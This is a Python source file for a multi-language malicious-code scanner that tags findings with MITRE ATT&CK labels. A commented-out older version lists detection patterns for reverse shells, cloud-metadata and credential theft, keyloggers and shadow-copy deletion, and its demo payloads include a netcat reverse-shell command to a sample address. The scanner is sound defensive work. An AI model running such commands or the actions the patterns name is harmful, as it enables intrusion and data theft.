import re
import math
import ast
from collections import Counter
from .behavior_rules import BEHAVIOR_RULES

# 🔥 CRITICAL IMPORT: This connects the "Brain" to the "Eyes"
try:
    from .mitre_mapping import get_mitre_tag
except ImportError:
    # Fallback if running standalone (debugging)
    def get_mitre_tag(k, m): return f"[GENERIC] {m}"

# =========================================================================
# 1. LANGUAGE DETECTION ENGINE (Supports 20+ Languages)
# =========================================================================
def detect_language(code: str) -> str:
    code = code.lower()
    
    # 1. Python
    if "def " in code and ("import " in code or "print(" in code) and ":" in code: return "python"
    # 2. C / C++
    if "#include" in code and ("int main" in code or "std::" in code or "printf" in code): return "cpp"
    # 3. Java
    if "public class" in code and "static void main" in code: return "java"
    # 4. JavaScript / Node.js
    if "function" in code and ("var " in code or "const " in code or "console.log" in code): return "javascript"
    # 5. PHP
    if "<?php" in code or ("$" in code and "echo" in code): return "php"
    # 6. Go (Golang)
    if "func " in code and "package " in code and "fmt." in code: return "go"
    # 7. PowerShell
    if "start-process" in code or "write-host" in code or "invoke-expression" in code: return "powershell"
    # 8. Bash / Shell
    if "#!/bin/bash" in code or "sudo " in code or "grep " in code or "rm -rf" in code: return "bash"
    # 9. C#
    if "using system;" in code or "namespace " in code or "console.writeline" in code: return "csharp"
    # 10. Ruby
    if "def " in code and "end" in code and ("require" in code or "puts" in code): return "ruby"
    # 11. Rust
    if "fn main" in code and ("let " in code or "println!" in code or "unsafe" in code): return "rust"
    # 12. Swift
    if "import foundation" in code or "func " in code and "var " in code and "let " in code: return "swift"
    # 13. Perl
    if "use strict" in code or ("my $" in code and "print" in code): return "perl"
    # 14. SQL
    if "select " in code and "from " in code and "where " in code: return "sql"
    # 15. R
    if "library(" in code and "<-" in code: return "r"
    # 16. Kotlin
    if "fun main" in code and "val " in code: return "kotlin"
    # 17. Scala
    if "object " in code and "def main" in code: return "scala"
    # 18. TypeScript
    if "interface " in code and "type " in code and "const " in code: return "typescript"
    # 19. Lua
    if "local " in code and "function" in code and "end" in code: return "lua"
    # 20. Dart
    if "void main()" in code and "import 'package:" in code: return "dart"
    # 21. Objective-C
    if "@interface" in code and "@implementation" in code: return "objectivec"
    
    return "general"

# =========================================================================
# 2. ENTROPY ENGINE (Obfuscation Detection)
# =========================================================================
def calculate_entropy(text):
    if not text: return 0
    counter = Counter(text)
    length = len(text)
    entropy = 0.0
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

# =========================================================================
# 3. LANGUAGE-SPECIFIC ANALYZERS (MITRE Integrated)
# =========================================================================

# --- PYTHON (AST) ---
class PythonThreatDetector(ast.NodeVisitor):
    def __init__(self): self.behaviors = []
    def visit_Call(self, node):
        func_name = ""
        if isinstance(node.func, ast.Name): func_name = node.func.id
        elif isinstance(node.func, ast.Attribute): func_name = node.func.attr
        
        # Check args for keywords
        for arg in node.args:
            if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
                val = arg.value.lower()
                if "docker.sock" in val: 
                    self.behaviors.append(get_mitre_tag("docker", "Container Escape Attempt"))
                if "sudo " in val: 
                    self.behaviors.append(get_mitre_tag("sudo", "Privilege Escalation Attempt"))
        
        # Check function names against MITRE DB
        if func_name == "dup2": 
            self.behaviors.append(get_mitre_tag("socket", "Reverse Shell (I/O Redirect)"))
        if func_name in ["eval", "exec"]: 
            self.behaviors.append(get_mitre_tag("eval(", "Unsafe Dynamic Code Execution"))
        if func_name == "system" or func_name == "popen":
            self.behaviors.append(get_mitre_tag("os.system", "System Command Execution"))
            
        self.generic_visit(node)

def analyze_python(code):
    behaviors = []
    try:
        tree = ast.parse(code)
        detector = PythonThreatDetector()
        detector.visit(tree)
        behaviors.extend(detector.behaviors)
    except: pass
    return behaviors

# --- JAVASCRIPT / TYPESCRIPT ---
def analyze_javascript(code):
    behaviors = []
    if re.search(r'eval\(', code): 
        behaviors.append(get_mitre_tag("eval(", "JS Dynamic Eval"))
    if re.search(r'child_process', code): 
        behaviors.append(get_mitre_tag("child_process", "NodeJS Command Execution"))
    if re.search(r'fs\.unlink', code): 
        behaviors.append(get_mitre_tag("fs.unlink", "File Deletion Detected"))
    return behaviors

# --- C / C++ ---
def analyze_cpp(code):
    behaviors = []
    if re.search(r'system\(', code): 
        behaviors.append(get_mitre_tag("system(", "C System Command"))
    if re.search(r'strcpy\(', code): 
        behaviors.append(get_mitre_tag("strcpy(", "Unsafe Buffer Copy"))
    if re.search(r'VirtualAlloc', code): 
        behaviors.append(get_mitre_tag("VirtualAlloc", "Memory Injection Allocation"))
    if re.search(r'CreateRemoteThread', code): 
        behaviors.append(get_mitre_tag("CreateRemoteThread", "Process Injection"))
    return behaviors

# --- JAVA ---
def analyze_java(code):
    behaviors = []
    if re.search(r'Runtime\.getRuntime\(\)\.exec', code): 
        behaviors.append(get_mitre_tag("Runtime.getRuntime", "Java Runtime Command"))
    if re.search(r'ProcessBuilder', code): 
        behaviors.append(get_mitre_tag("ProcessBuilder", "Java Process Execution"))
    return behaviors

# --- C# (C-SHARP) ---
def analyze_csharp(code):
    behaviors = []
    if re.search(r'Process\.Start', code): 
        behaviors.append(get_mitre_tag("Process.Start", ".NET Process Execution"))
    if re.search(r'DllImport', code): 
        behaviors.append(get_mitre_tag("VirtualAlloc", "Native DLL Import (Potential Injection)"))
    return behaviors

# --- RUST ---
def analyze_rust(code):
    behaviors = []
    if re.search(r'unsafe\s*\{', code): 
        behaviors.append(get_mitre_tag("VirtualAlloc", "Unsafe Memory Block"))
    if re.search(r'std::process::Command', code): 
        behaviors.append(get_mitre_tag("std::process", "Rust Command Execution"))
    return behaviors

# --- RUBY ---
def analyze_ruby(code):
    behaviors = []
    if re.search(r'eval\(', code): 
        behaviors.append(get_mitre_tag("eval(", "Ruby Dynamic Eval"))
    if re.search(r'syscall', code): 
        behaviors.append(get_mitre_tag("syscall", "Ruby System Call"))
    return behaviors

# --- PHP ---
def analyze_php(code):
    behaviors = []
    if re.search(r'shell_exec', code): 
        behaviors.append(get_mitre_tag("shell_exec", "PHP Shell Execution"))
    if re.search(r'passthru', code): 
        behaviors.append(get_mitre_tag("passthru", "PHP Passthru Execution"))
    return behaviors

# --- GO (GOLANG) ---
def analyze_go(code):
    behaviors = []
    if re.search(r'os/exec', code): 
        behaviors.append(get_mitre_tag("os/exec", "Go Command Execution"))
    return behaviors

# --- PERL ---
def analyze_perl(code):
    behaviors = []
    if re.search(r'eval\(', code): 
        behaviors.append(get_mitre_tag("eval(", "Perl Dynamic Eval"))
    if re.search(r'system\(', code): 
        behaviors.append(get_mitre_tag("exec(", "Perl System Command"))
    return behaviors

# --- SWIFT ---
def analyze_swift(code):
    behaviors = []
    if re.search(r'Process\(\)', code) or re.search(r'Process\.launch', code): 
        behaviors.append(get_mitre_tag("Process()", "Swift Process Execution"))
    return behaviors

# --- BASH / POWERSHELL / SQL ---
def analyze_shell_sql(code, lang):
    behaviors = []
    if lang == "bash":
        if re.search(r'rm\s+-rf', code): 
            behaviors.append(get_mitre_tag("fs.unlink", "Destructive Command (rm -rf)"))
        if re.search(r'/dev/tcp', code): 
            behaviors.append(get_mitre_tag("4444", "Reverse Shell Pattern"))
            
    elif lang == "powershell":
        if re.search(r'Invoke-Expression', code, re.I): 
            behaviors.append(get_mitre_tag("Invoke-Expression", "PowerShell IEX Detected"))
        if re.search(r'-EncodedCommand', code, re.I): 
            behaviors.append(get_mitre_tag("base64", "Encoded PowerShell Command"))
            
    elif lang == "sql":
        if re.search(r'UNION SELECT', code, re.I): 
            behaviors.append(get_mitre_tag("UNION SELECT", "SQL Injection Pattern"))
        if re.search(r'xp_cmdshell', code, re.I): 
            behaviors.append(get_mitre_tag("xp_cmdshell", "MSSQL Command Shell"))
    return behaviors

# =========================================================================
# 4. UNIVERSAL SCANNER (Safety Net)
# =========================================================================
def scan_text_patterns(text):
    behaviors = []
    # Scans for anything missed by specific parsers
    for rule in BEHAVIOR_RULES:
        if re.search(rule["pattern"], text, re.IGNORECASE | re.MULTILINE):
            # Try to map safety net findings to MITRE
            tag = get_mitre_tag(rule["name"], f"Signature: {rule['name']}")
            behaviors.append(tag)
    return behaviors

# =========================================================================
# 5. MAIN ANALYZER ROUTER
# =========================================================================
def analyze_code(code_content: str):
    behaviors = []
    language = detect_language(code_content)
    
    # Optional: You can remove this if you want cleaner output
    # behaviors.append(f"LANGUAGE DETECTED: {language.upper()}")

    # Route to specific analyzer
    if language == "python": behaviors.extend(analyze_python(code_content))
    elif language in ["javascript", "typescript"]: behaviors.extend(analyze_javascript(code_content))
    elif language == "cpp": behaviors.extend(analyze_cpp(code_content))
    elif language == "java": behaviors.extend(analyze_java(code_content))
    elif language == "csharp": behaviors.extend(analyze_csharp(code_content))
    elif language == "rust": behaviors.extend(analyze_rust(code_content))
    elif language == "ruby": behaviors.extend(analyze_ruby(code_content))
    elif language == "php": behaviors.extend(analyze_php(code_content))
    elif language == "go": behaviors.extend(analyze_go(code_content))
    elif language == "perl": behaviors.extend(analyze_perl(code_content))
    elif language == "swift": behaviors.extend(analyze_swift(code_content))
    elif language in ["bash", "powershell", "sql"]: behaviors.extend(analyze_shell_sql(code_content, language))
    
    # Universal fallback for everyone (R, Lua, Kotlin, Scala, Dart, Obj-C, etc.)
    behaviors.extend(scan_text_patterns(code_content))

    # Entropy Check
    long_strings = re.findall(r'["\'](.*?)["\']', code_content)
    for s in long_strings:
        if len(s) > 50 and calculate_entropy(s) > 5.8:
            behaviors.append(get_mitre_tag("base64", "High Entropy String (Potential Payload)"))

    return list(set(behaviors))
# import re
# import ast
# import math
# import json
# from collections import Counter

# # =========================================================================
# # 1. KNOWLEDGE BASE: MITRE ATT&CK & BEHAVIOR RULES (50+ Vectors)
# # =========================================================================

# # Helper to format tags
# def get_mitre_tag(trigger, name, id_override=None):
#     return {
#         "trigger": trigger,
#         "threat": name,
#         "mitre_id": id_override if id_override else "T1059" # Default to Command Exec
#     }

# # The Master Ruleset (50+ Vectors across 20+ Languages)
# BEHAVIOR_RULES = [
#     # --- CRITICAL RCE & EXECUTION ---
#     {"pattern": r"\b(os\.system|subprocess\.call|cmd\.exe|/bin/sh|/bin/bash|powershell)\b", "name": "Critical Command Execution", "languages": ["python", "shell"]},
#     {"pattern": r"\b(system\(|execv|popen|ShellExecute|CreateProcess)\b", "name": "C/C++ System Execution", "languages": ["c", "cpp"]},
#     {"pattern": r"\b(Runtime\.getRuntime\(\)\.exec|ProcessBuilder)\b", "name": "Java Command Execution", "languages": ["java"]},
#     {"pattern": r"\b(child_process\.exec|spawn|eval\(|document\.write)\b", "name": "JS/Node Execution", "languages": ["javascript", "typescript"]},
#     {"pattern": r"\b(shell_exec|passthru|proc_open|pcntl_exec)\b", "name": "PHP Web Shell", "languages": ["php"]},
#     {"pattern": r"\b(os/exec\.Command|syscall\.Exec)\b", "name": "Go Command Execution", "languages": ["go"]},
#     {"pattern": r"\b(std::process::Command)\b", "name": "Rust Command Execution", "languages": ["rust"]},
#     {"pattern": r"\b(Process\.Start)\b", "name": ".NET Process Start", "languages": ["csharp"]},
#     {"pattern": r"\b(Kernel\.exec|system\s*\(|`.*`)\b", "name": "Ruby/Perl Execution", "languages": ["ruby", "perl"]},
#     {"pattern": r"\b(Start-Process|Invoke-Expression|IEX)\b", "name": "PowerShell Execution", "languages": ["powershell"]},
    
#     # --- NETWORK & EXFILTRATION ---
#     {"pattern": r"(nc\s+-e|nc\.exe|/dev/tcp/|socket\.connect|bash\s+-i\s+>&)", "name": "Reverse Shell (Netcat/Bash)", "languages": ["shell", "python"]},
#     {"pattern": r"\b(requests\.post|urllib|http\.client|LWP::UserAgent)\b", "name": "HTTP Exfiltration", "languages": ["python", "perl"]},
#     {"pattern": r"\b(net\.Dial|http\.Post|fsockopen)\b", "name": "Socket/Web Connection", "languages": ["go", "php"]},
#     {"pattern": r"(169\.254\.169\.254|aws_secret_access_key|s3://)", "name": "Cloud Metadata Theft", "languages": ["all"]},
#     {"pattern": r"\b(ngrok|chisel|frpc|dnscat)\b", "name": "Tunneling Tool Detected", "languages": ["all"]},

#     # --- PERSISTENCE & PRIVILEGE ESCALATION ---
#     {"pattern": r"(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run|REG\s+ADD)", "name": "Registry Persistence", "languages": ["all"]},
#     {"pattern": r"(schtasks|crontab|init\.d|rc\.local|systemctl\s+enable)", "name": "Scheduled Task/Service", "languages": ["shell", "all"]},
#     {"pattern": r"(sudo\s+|uac_bypass|whoami\s+/priv|chmod\s+777|chown\s+root)", "name": "Privilege Escalation", "languages": ["shell"]},
#     {"pattern": r"(docker\.sock|kubectl\s+exec|cap_sys_admin|privileged: true)", "name": "Container Escape", "languages": ["yaml", "shell", "python"]},

#     # --- DESTRUCTION & RANSOMWARE ---
#     {"pattern": r"(vssadmin.*delete|wbadmin.*delete|bcdedit.*recoveryenabled)", "name": "Shadow Copy Deletion", "languages": ["shell", "batch"]},
#     {"pattern": r"(cipher\s+/w|shutil\.rmtree|fs\.unlink|rm\s+-rf|format\s+c:)", "name": "Data Destruction/Wipe", "languages": ["all"]},
#     {"pattern": r"\b(Fernet|AES\.new|ChaCha20|RansomNote)\b", "name": "Encryption Logic (Ransomware)", "languages": ["python", "java", "go"]},

#     # --- CREDENTIAL THEFT & SPYWARE ---
#     {"pattern": r"\b(Mimikatz|Sekurlsa|procdump|lsass|samdump)\b", "name": "Credential Dumping Tool", "languages": ["all"]},
#     {"pattern": r"\b(pynput|GetAsyncKeyState|SetWindowsHookEx|KeyLogger)\b", "name": "Keylogging Activity", "languages": ["python", "cpp", "csharp"]},
#     {"pattern": r"\b(ImageGrab\.grab|SoundRecorder|BitBlt|GDI32)\b", "name": "Screen/Audio Surveillance", "languages": ["python", "csharp"]},

#     # --- OBFUSCATION ---
#     {"pattern": r"\b(base64\.b64decode|fromBase64String|eval\(|str_rot13|gzinflate)\b", "name": "Obfuscation/Packing", "languages": ["all"]},
#     {"pattern": r"(VirtualProtect|VirtualAlloc|CreateRemoteThread|WriteProcessMemory)", "name": "Memory Injection", "languages": ["cpp", "csharp"]},
# ]

# # =========================================================================
# # 2. THE POLYGLOT ENGINE
# # =========================================================================
# class PolyglotAnalyzer:
#     def __init__(self):
#         self.findings = []
        
#         # 22+ Language Signatures for Detection
#         self.lang_signatures = {
#             # --- WEB & SCRIPTING ---
#             "python":     {"keywords": ["def ", "import ", "print(", "if __name__"], "comment": "#"},
#             "javascript": {"keywords": ["function", "console.log", "const ", "let ", "=>"], "comment": "//"},
#             "typescript": {"keywords": ["interface ", "type ", "implements", "readonly"], "comment": "//"},
#             "php":        {"keywords": ["<?php", "echo", "$_GET", "$_POST", "namespace"], "comment": "//"},
#             "ruby":       {"keywords": ["def ", "end", "require", "puts", "module"], "comment": "#"},
#             "perl":       {"keywords": ["my $", "use strict", "print", "sub "], "comment": "#"},
#             "lua":        {"keywords": ["local ", "function", "end", "repeat"], "comment": "--"},
            
#             # --- SYSTEMS & COMPILED ---
#             "c":          {"keywords": ["#include", "printf", "struct", "void main"], "comment": "//"},
#             "cpp":        {"keywords": ["#include", "std::", "cout", "namespace", "class"], "comment": "//"},
#             "java":       {"keywords": ["public class", "static void", "System.out", "package"], "comment": "//"},
#             "csharp":     {"keywords": ["using System;", "namespace", "Console.WriteLine"], "comment": "//"},
#             "go":         {"keywords": ["func ", "package ", "import (", "fmt.Print"], "comment": "//"},
#             "rust":       {"keywords": ["fn main", "println!", "let mut", "impl", "use std"], "comment": "//"},
#             "swift":      {"keywords": ["import Foundation", "func ", "var ", "let ", "print("], "comment": "//"},
#             "objectivec": {"keywords": ["@interface", "@implementation", "NSLog", "@property"], "comment": "//"},
            
#             # --- SHELL & CONFIG ---
#             "shell":      {"keywords": ["#!/bin/", "sudo ", "grep ", "rm ", "echo "], "comment": "#"},
#             "powershell": {"keywords": ["Write-Host", "Start-Process", "Get-", "Set-"], "comment": "#"},
#             "batch":      {"keywords": ["@echo off", "rem ", "goto ", "set "], "comment": "REM"},
#             "sql":        {"keywords": ["SELECT ", "FROM ", "WHERE ", "INSERT INTO"], "comment": "--"},
#             "yaml":       {"keywords": ["apiVersion:", "kind:", "metadata:", "spec:"], "comment": "#"},
#             "dockerfile": {"keywords": ["FROM ", "RUN ", "CMD ", "ENTRYPOINT"], "comment": "#"},
#             "r":          {"keywords": ["library(", "<-", "print("], "comment": "#"}
#         }

#     # --- CORE: LANGUAGE DETECTION ---
#     def detect_language(self, code: str) -> str:
#         scores = {lang: 0 for lang in self.lang_signatures}
#         for lang, props in self.lang_signatures.items():
#             for kw in props["keywords"]:
#                 if kw in code:
#                     scores[lang] += 1
        
#         # refinement: C vs C++ vs ObjC
#         if scores['c'] > 0 and scores['cpp'] > 0:
#             if "class" in code or "std::" in code: scores['c'] = 0
#             else: scores['cpp'] = 0
            
#         best_match = max(scores, key=scores.get)
#         return best_match if scores[best_match] > 0 else "generic"

#     # --- ANALYZER: PYTHON AST ---
#     class PythonASTVisitor(ast.NodeVisitor):
#         def __init__(self):
#             self.ast_findings = []
#         def visit_Call(self, node):
#             func_name = ""
#             if isinstance(node.func, ast.Name): func_name = node.func.id
#             elif isinstance(node.func, ast.Attribute): func_name = node.func.attr

#             triggers = {
#                 "eval": "Unsafe Dynamic Code Exec", "exec": "Unsafe Dynamic Code Exec",
#                 "system": "System Command Exec", "popen": "System Command Exec",
#                 "run": "Subprocess Execution", "loads": "Deserialization Risk"
#             }
#             if func_name in triggers:
#                 self.ast_findings.append({
#                     "type": "AST_MATCH",
#                     "line": node.lineno,
#                     "tag": get_mitre_tag(func_name, triggers[func_name])
#                 })
#             self.generic_visit(node)

#     def _analyze_python_ast(self, code):
#         try:
#             tree = ast.parse(code)
#             visitor = self.PythonASTVisitor()
#             visitor.visit(tree)
#             return visitor.ast_findings
#         except SyntaxError:
#             return []

#     # --- ANALYZER: UNIVERSAL REGEX ---
#     def _scan_regex_patterns(self, code, language):
#         regex_findings = []
#         lines = code.split('\n')
        
#         for rule in BEHAVIOR_RULES:
#             # Flexible Language Matching
#             rule_langs = rule["languages"]
#             is_match = False
            
#             if "all" in rule_langs: is_match = True
#             elif language in rule_langs: is_match = True
#             elif language == "cpp" and "c" in rule_langs: is_match = True # C rules apply to C++
            
#             if not is_match: continue

#             pattern = re.compile(rule["pattern"], re.IGNORECASE)
            
#             for i, line in enumerate(lines):
#                 if pattern.search(line):
#                     # Entropy Check
#                     entropy = 0
#                     strings = re.findall(r'["\'](.*?)["\']', line)
#                     if strings: entropy = self._calculate_entropy(strings[0])

#                     regex_findings.append({
#                         "type": "REGEX_MATCH",
#                         "line": i + 1,
#                         "content": line.strip()[:60],
#                         "entropy": entropy,
#                         "tag": get_mitre_tag(rule["pattern"], rule["name"])
#                     })
#         return regex_findings

#     def _calculate_entropy(self, text):
#         if not text or len(text) < 15: return 0
#         counter = Counter(text)
#         length = len(text)
#         entropy = 0.0
#         for count in counter.values():
#             p = count / length
#             entropy -= p * math.log2(p)
#         return round(entropy, 2)

#     # --- MAIN EXECUTION ---
#     def analyze(self, code_content: str):
#         self.findings = []
#         language = self.detect_language(code_content)
        
#         # 1. Specialized Parsers
#         if language == "python":
#             self.findings.extend(self._analyze_python_ast(code_content))
            
#         # 2. Universal Scanners
#         self.findings.extend(self._scan_regex_patterns(code_content, language))
        
#         # 3. Report
#         return {
#             "metadata": {
#                 "language_detected": language.upper(),
#                 "scan_engine": "CyberSentinel v3.0",
#                 "total_findings": len(self.findings)
#             },
#             "findings": self.findings
#         }

# # =========================================================================
# # 3. DEMONSTRATION
# # =========================================================================
# if __name__ == "__main__":
#     analyzer = PolyglotAnalyzer()
    
#     # MIXED LANGUAGE PAYLOAD SIMULATION
#     payloads = [
#         """
#         import os, base64
#         def pwn():
#             # T1059: Command Execution
#             os.system("nc -e /bin/bash 10.0.0.1 4444")
#             # T1027: Obfuscation
#             c2 = base64.b64decode("ZXZpbC5jb20=") 
#         """,
#         """
#         #include <iostream>
#         #include <windows.h>
#         int main() {
#             // T1055: Memory Injection
#             void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#             system("cmd.exe /c whoami");
#         }
#         """
#     ]

#     print(f"{'='*60}\n CYBERSENTINEL v3.0 - MULTI-LANGUAGE THREAT SCAN\n{'='*60}")
    
#     for idx, code in enumerate(payloads):
#         result = analyzer.analyze(code)
#         meta = result['metadata']
#         print(f"\n[FILE {idx+1}] Language: {meta['language_detected']} | Threats: {meta['total_findings']}")
        
#         for f in result['findings']:
#             tag = f['tag']
#             loc = f"Line {f['line']}"
#             print(f"  -> [{tag['mitre_id']}] {tag['threat']} ({loc})")
#             if 'entropy' in f and f['entropy'] > 4.5:
#                 print(f"     [!] High Entropy Detected: {f['entropy']}")
# # =========================================================================
# # 4. EXPORT WRAPPER (The Backward-Compatible Bridge)
# # =========================================================================

# # Initialize the engine once
# _engine_instance = PolyglotAnalyzer()

# def analyze_code(code_content: str):
#     """
#     Wrapper function to maintain backward compatibility with routes.
#     The route expects a LIST of findings, so we extract ['findings'] 
#     from the full report.
#     """
#     full_report = _engine_instance.analyze(code_content)
    
#     # 🔥 FIX: Return only the list, ignoring metadata for now to prevent crashes
#     return full_report.get("findings", [])